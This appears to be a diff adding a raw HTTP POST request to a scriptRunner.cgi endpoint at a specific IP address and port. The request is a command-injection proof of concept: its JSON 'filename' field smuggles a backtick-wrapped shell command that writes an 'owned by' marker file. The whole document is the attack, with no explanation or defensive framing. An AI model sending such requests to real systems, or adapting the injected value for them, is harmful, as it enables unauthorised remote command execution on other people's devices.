@@ -1,0 +1,13 @@
+POST /scriptRunner.cgi HTTP/1.1
+Host: 207.195.53.107:8081
+Content-Length: 46
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Origin: http://207.195.53.107:8081
+Referer: http://207.195.53.107:8081/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"filename":"`echo owned by alroky>test.txt`"}
